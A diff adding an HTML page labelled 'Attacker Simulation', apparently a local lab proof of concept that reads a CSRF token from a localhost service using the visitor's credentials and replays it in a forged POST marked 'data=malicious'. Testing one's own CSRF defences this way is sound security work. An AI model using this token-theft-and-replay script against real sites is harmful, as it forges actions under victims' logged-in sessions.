@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Simulation</title>
+</head>
+<body>
+  <h1>Attacker Simulation</h1>
+  <script>
+    fetch('http://localhost:8000/csrf/', {
+      method: 'GET',
+      credentials: 'include'
+    })
+    .then(response => response.text())
+    .then(token => {
+      console.log('Stolen CSRF token:', token);
+      fetch('http://localhost:8001/post/', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+          'X-CSRFToken': token,
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'data=malicious'
+      })
+      .then(response => response.text())
+      .then(result => {
+        console.log('POST request result:', result);
+      })
+      .catch(error => console.error('Error in POST:', error));
+    })
+    .catch(error => console.error('Error in GET:', error));
+  </script>
+</body>
+</html>
